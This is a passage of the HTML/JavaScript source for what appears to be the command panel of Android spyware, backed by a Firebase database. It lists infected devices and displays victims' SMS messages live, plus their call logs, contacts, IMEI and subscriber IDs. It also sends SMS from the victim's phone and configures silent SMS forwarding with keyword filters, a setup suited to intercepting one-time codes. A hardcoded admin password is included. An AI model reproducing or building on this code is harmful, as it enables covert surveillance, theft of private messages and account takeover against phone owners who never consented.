    devMeta[id].liveTs    = ts;
    devMeta[id].liveTsAge = tsAge;
    refreshDevList();
  });
  // device_info (model, brand, android)
  DB.ref('devices/'+id+'/device_info').on('value', function(s){
    var info = s.val()||{};
    devMeta[id].name    = info.device_model||'Unknown';
    devMeta[id].brand   = info.device_brand||'';
    devMeta[id].android = info.android_version||'';
    // get sms total_count from all_sms (lightweight: only total_count field)
    DB.ref('devices/'+id+'/all_sms/total_count').once('value', function(sc){
      devMeta[id].smsCount = sc.val()||0;
      refreshDevList();
    });
    refreshDevList();
  });
}

function refreshDevList(){
  var now = Date.now();
  allDevs = Object.values(devMeta).map(function(m){
    var ts = m.liveTs||0;
    var tsAge = (ts>0 && now>ts)?(now-ts):0;
    var on = (m.online_status===true)||(m.online_status==1)||(tsAge>0&&tsAge<300000);
    return Object.assign({}, m, {status: on?'online':'offline'});
  });
  allDevs.sort(function(a,b){
    return a.status==='online'&&b.status!=='online'?-1:
           a.status!=='online'&&b.status==='online'?1:
           b.lastSeen-a.lastSeen;
  });
  if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
  if(selDev&&!allDevs.find(function(d){return d.id===selDev;}))
    selDev=allDevs.length>0?allDevs[0].id:'';
  document.getElementById('mainLayout').style.display='flex';
  renderSidebar(); updateStats();
}

// ═══ SIDEBAR ═══
function renderSidebar(){
  var el=document.getElementById('devList'), q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=allDevs.filter(function(d){return !q||(d.name+d.id+d.brand).toLowerCase().includes(q);});
  if(!list.length){el.innerHTML='<div class="dev-empty">📡 No devices found</div>';return;}
  el.innerHTML=list.map(function(d){
    var bc=d.battery>50?'bat-hi':d.battery>20?'bat-md':'bat-lo';
    return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDevice(\''+d.id+'\')">'+
      '<div class="dev-top"><span class="dev-name">'+esc(d.name)+'</span><span class="dev-dot '+d.status+'"></span></div>'+
      '<div class="dev-uid">'+esc(d.id.substring(0,20))+'...</div>'+
      '<div class="dev-chips"><span class="dchip '+bc+'">⚡'+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
      '<span class="dchip">'+esc(d.network)+'</span>'+
      '<span class="dchip">'+d.smsCount+' SMS</span>'+(d.status==="online"?'<span class="dchip" style="color:var(--success);border-color:rgba(0,255,157,0.2)">● ACTIVE</span>':'')+'</div></div>';
  }).join('');
}

function updateStats(){
  document.getElementById('stTotal').textContent=allDevs.length;
  document.getElementById('stOnline').textContent=allDevs.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=allDevs.filter(function(d){return d.status==='offline';}).length;
}

// ═══ OPEN DEVICE ═══
function openDevice(id){
  selDev=id; renderSidebar();
  document.getElementById('emptyState').classList.add('hidden');
  document.getElementById('deviceDetail').classList.remove('hidden');
  var dev=allDevs.find(function(d){return d.id===id;});
  if(dev) updateHero(dev);
  loadDeviceData(id);
}

function updateHero(d){
  document.getElementById('dName').textContent=d.name+(d.brand?' ('+d.brand+')':'');
  document.getElementById('dBrand').textContent='Android '+d.android;
  document.getElementById('dId').textContent='ID: '+d.id;
  var badge=document.getElementById('dBadge');
  badge.className='hero-badge '+d.status;
  badge.textContent=d.status==='online'?'● ONLINE':'○ OFFLINE';
  document.getElementById('dBat').textContent=d.battery+'%'+(d.charging?' ⚡':'');
  document.getElementById('dNet').textContent=d.network;
  document.getElementById('dAndroid').textContent=d.android||'?';
  document.getElementById('dSmsCount').textContent=d.smsCount;
  if(d.status==='online'){
    document.getElementById('dLastSeen').textContent='● ACTIVE';
    document.getElementById('dLastSeen').style.color='var(--success)';
  } else {
    var diff=Date.now()-d.lastSeen;
    document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
    document.getElementById('dLastSeen').style.color='var(--muted)';
  }
}

// ═══ LOAD DEVICE DATA ═══
function loadDeviceData(id){
  Object.keys(activeListeners).forEach(function(p){DB.ref(p).off('value',activeListeners[p]);});
  activeListeners={};
  var ref='devices/'+id;
  function on(path,cb){activeListeners[path]=DB.ref(path).on('value',cb);}

  // Real-time NEW SMS (arrives within 1-2 seconds of device receiving it)
  on(ref+'/new_sms',function(snap){
    if(!snap.exists()) return;
    var newMsgs=[];
    snap.forEach(function(c){newMsgs.push(c.val());});
    newMsgs.reverse(); // latest first
    window._newSmsData = newMsgs;
    renderSmsList();
  });

  // Full SMS list (updates when count changes, ~3-60s after new SMS)
  on(ref+'/all_sms',function(snap){
    var d=snap.val();
    window._allSmsData = (d&&d.messages)?d.messages:[];
    window._allSmsTotal = d?d.total_count||0:0;
    renderSmsList();
  });

  // CALLS
  on(ref+'/all_calls',function(snap){
    var d=snap.val(), tb=document.getElementById('callsTbody');
    if(!d||!d.calls){tb.innerHTML='<tr><td colspan="6" class="tbl-empty">No call data</td></tr>';document.getElementById('tc-calls').textContent='0';return;}
    document.getElementById('tc-calls').textContent=d.total_count||d.calls.length;
    tb.innerHTML=d.calls.map(function(c,i){
      var type=(c.type||'').toLowerCase();
      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
        '<td><b>'+esc(c.number||'?')+'</b></td>'+
        '<td>'+esc(c.contact_name||'—')+'</td>'+
        '<td class="mono" style="color:var(--muted)">'+esc(c.date_readable||'—')+'</td>'+
        '<td class="mono">'+esc(c.duration||'0')+'s</td>'+
        '<td><span class="sbadge '+type+'">'+esc(c.type||'?')+'</span></td></tr>';
    }).join('');
  });

  // CONTACTS
  on(ref+'/all_contacts',function(snap){
    var d=snap.val(), tb=document.getElementById('contactsTbody');
    if(!d||!d.contacts){tb.innerHTML='<tr><td colspan="3" class="tbl-empty">No contacts data</td></tr>';document.getElementById('tc-contacts').textContent='0';return;}
    document.getElementById('tc-contacts').textContent=d.total_count||d.contacts.length;
    tb.innerHTML=d.contacts.map(function(c,i){
      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
        '<td><b>'+esc(c.name||'No Name')+'</b></td>'+
        '<td class="mono" style="color:var(--accent2)">'+esc(c.phone||'—')+'</td></tr>';
    }).join('');
  });

  // SIM
  on(ref+'/device_info/sim_info',function(snap){
    var s=snap.val(), g=document.getElementById('simGrid');
    if(!s){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No SIM info yet</div>';return;}
    var fields=[['📱 SIM Operator',s.sim_operator_name],['🏢 Network',s.network_operator_name],['🆔 IMEI',s.imei],['📋 Subscriber ID',s.subscriber_id]];
    g.innerHTML='<div class="sim-card">'+fields.map(function(f){
      return '<div class="sim-row"><span class="sim-key">'+f[0]+'</span><span class="sim-val">'+(f[1]?esc(f[1]):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
    }).join('')+'</div>';
  });

  // PERMS
  on(ref+'/live_data/permissions',function(snap){
    var p=snap.val(), g=document.getElementById('permGrid'); if(!p){g.innerHTML='';return;}
    g.innerHTML=Object.entries(p).map(function(e){
      return '<div class="perm-item"><span class="perm-name">'+e[0].replace(/_/g,' ')+'</span>'+
        '<span class="sbadge '+(e[1]?'granted':'denied')+'">'+(e[1]?'✅ OK':'❌ Denied')+'</span></div>';
    }).join('');
  });

  // SENT SMS
  on(ref+'/sent_sms',function(snap){
    var tb=document.getElementById('sentTbody'); if(!snap.exists()){tb.innerHTML='';return;}
    var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
    tb.innerHTML=l.map(function(r){
      return '<tr><td><b>'+esc(r.to||'?')+'</b></td>'+
        '<td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.message||'—')+'</td>'+
        '<td><span class="sbadge sent">SENT</span></td>'+
        '<td class="mono" style="color:var(--muted)">'+(r.sent_at?new Date(r.sent_at).toLocaleString():'—')+'</td></tr>';
    }).join('');
  });

  // FORWARDING SETTINGS
  on(ref+'/forwarding_settings',function(snap){
    var s=snap.val(); if(!s) return;
    document.getElementById('fwToggle').checked=s.enabled||false;
    document.getElementById('fwNumber').value=s.forward_to||'';
    document.getElementById('fwAll').checked=s.forward_all!==false;
    if(s.filters&&Array.isArray(s.filters)) document.getElementById('fwFilters').value=s.filters.join(', ');
    document.getElementById('fwFilterDiv').style.display=s.forward_all!==false?'none':'block';
  });

  // FORWARD LOG
  on(ref+'/forwarded_sms',function(snap){
    var tb=document.getElementById('fwTbody'); if(!snap.exists()){tb.innerHTML='';return;}
    var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
    tb.innerHTML=l.map(function(r){
      return '<tr><td><b>'+esc(r.from||'?')+'</b></td><td>'+esc(r.to||'?')+'</td>'+
        '<td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.body||'—')+'</td>'+
        '<td class="mono" style="color:var(--muted)">'+(r.forwarded_at?new Date(r.forwarded_at).toLocaleString():'—')+'</td></tr>';
    }).join('');
  });
}

// ═══ DATA TABS ═══
function switchDataTab(name,btn){
  document.querySelectorAll('.data-tab').forEach(function(b){b.classList.remove('active');});
  btn.classList.add('active');
  document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
  document.getElementById('tab-'+name).classList.add('active');
}

// ═══ SEND SMS ═══
function sendSms(){
  if(!selDev){showToast('error','No device selected!');return;}
  var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
  if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
  DB.ref('devices/'+selDev+'/manual_commands/send_sms').push({to:n,message:m,timestamp:firebase.database.ServerValue.TIMESTAMP})
    .then(function(){document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Command sent!</span>';document.getElementById('sendMsg').value='';showToast('success','✅ SMS queued on device');})
    .catch(function(e){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+e.message+'</span>';});
}

// ═══ FORWARDING ═══
function toggleFw(){if(!selDev)return;DB.ref('devices/'+selDev+'/forwarding_settings/enabled').set(document.getElementById('fwToggle').checked);}
function saveFw(){
  if(!selDev){showToast('error','No device selected!');return;}
  var filters=document.getElementById('fwFilters').value.split(',').map(function(f){return f.trim();}).filter(Boolean);
  DB.ref('devices/'+selDev+'/forwarding_settings').set({
    enabled:document.getElementById('fwToggle').checked,
    forward_to:document.getElementById('fwNumber').value.trim(),
    forward_all:document.getElementById('fwAll').checked,
    filters:filters,
    updated_at:firebase.database.ServerValue.TIMESTAMP
  },function(e){e?showToast('error','❌ Save failed'):showToast('success','✅ Settings saved!');});
}

// ═══ HELPERS ═══

function renderSmsList(){
  var tb=document.getElementById('smsTbody');
  var newMsgs=window._newSmsData||[];
  var allMsgs=window._allSmsData||[];
  var total=window._allSmsTotal||0;

  // Merge: new_sms at top, then all_sms (deduped by date)
  var newDates=newMsgs.map(function(m){return m.date;});
  var filteredAll=allMsgs.filter(function(m){return newDates.indexOf(m.date)<0;});
  var merged=newMsgs.concat(filteredAll).slice(0,100);

  window._smsData=merged;
  document.getElementById('tc-sms').textContent=(newMsgs.length+total)+' (showing 100)';

  if(!merged.length){
    tb.innerHTML='<tr><td colspan="5" class="tbl-empty">📭 No SMS data. Grant READ_SMS on device.</td></tr>';
    document.getElementById('smsEmpty')?document.getElementById('smsEmpty').style.display='':null;
    return;
  }
  tb.innerHTML=merged.map(function(s,i){
    var isNew=i<newMsgs.length&&newMsgs.indexOf(s)>=0;
    var type=(s.type||'').toLowerCase();
    var dispBody=s.body&&s.body.length>60?esc(s.body.substring(0,60))+'…':esc(s.body||'—');
    return '<tr class="sms-row-click" onclick="openSmsModal('+i+')">' +
      '<td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
      '<td><b>'+esc(s.address||'?')+'</b>'+(isNew?'<span style="margin-left:4px;background:rgba(255,60,60,0.2);color:var(--accent);font-size:8px;padding:1px 5px;border-radius:8px;font-family:Space Mono,monospace">NEW</span>':'')+'</td>'+
      '<td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+dispBody+'</td>'+
      '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
      '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
  }).join('');
}

function openSmsModal(idx){
  var s=(window._smsData||[])[idx];
  if(!s) return;
  document.getElementById('modalFrom').textContent = '📱 From: ' + (s.address||'?');
  document.getElementById('modalDate').textContent = '🕐 ' + (s.date_readable||'—') + '  |  ' + (s.type||'');
  document.getElementById('modalBody').textContent = s.body||'(empty)';
  document.getElementById('smsModal').classList.remove('hidden');
}
function closeSmsModal(e){
  if(e.target === document.getElementById('smsModal'))
    document.getElementById('smsModal').classList.add('hidden');
}
document.addEventListener('keydown',function(e){
  if(e.key==='Escape') document.getElementById('smsModal').classList.add('hidden');
});

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function filterRows(id,q){q=q.toLowerCase();document.querySelectorAll('#'+id+' tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});}
function showToast(t,m){var c=document.getElementById('toastContainer'),d=document.createElement('div');d.className='toast '+t;d.innerHTML='<span>'+(t==='success'?'✅':'❌')+'</span><span>'+m+'</span>';c.appendChild(d);setTimeout(function(){d.classList.add('out');setTimeout(function(){d.remove();},250);},2800);}

// ═══ LOGIN ═══
var AU='admin',AP='rebel2024';
(function(){
  var s=null;
  try{s=JSON.parse(localStorage.getItem('rbl_login'));}catch(e){}
  if(s&&s.u){
    document.getElementById('loginUser').value=s.u;
    document.getElementById('loginPass').value=s.p;
    document.getElementById('rememberMe').checked=true;
    // Auto-login if saved credentials match
    if(s.u==='admin'&&s.p==='rebel2024'){
      document.getElementById('loginPage').classList.add('hidden');
    }
  }
})();
function doLogin(){
  var u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value;
  if(u===AU&&p===AP){if(document.getElementById('rememberMe').checked)localStorage.setItem('rbl_login',JSON.stringify({u:u,p:p}));else localStorage.removeItem('rbl_login');document.getElementById('loginError').style.display='none';document.getElementById('loginPage').classList.add('hidden');}
  else{document.getElementById('loginError').style.display='block';document.getElementById('loginPass').value='';}
}
document.addEventListener('keydown',function(e){if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter')doLogin();});
setInterval(function(){
  document.getElementById('footerTime').textContent=new Date().toLocaleString();
  // Refresh hero metrics in real-time
  if(selDev) {
    var dev=allDevs.find(function(d){return d.id===selDev;});
    if(dev) {
      if(dev.status==='online'){
        document.getElementById('dLastSeen').textContent='● ACTIVE';
        document.getElementById('dLastSeen').style.color='var(--success)';
      } else {
        var diff=Date.now()-dev.lastSeen;
        document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
        document.getElementById('dLastSeen').style.color='var(--muted)';
      }
    }
  }
},1000);
</script>
</body>
</html>
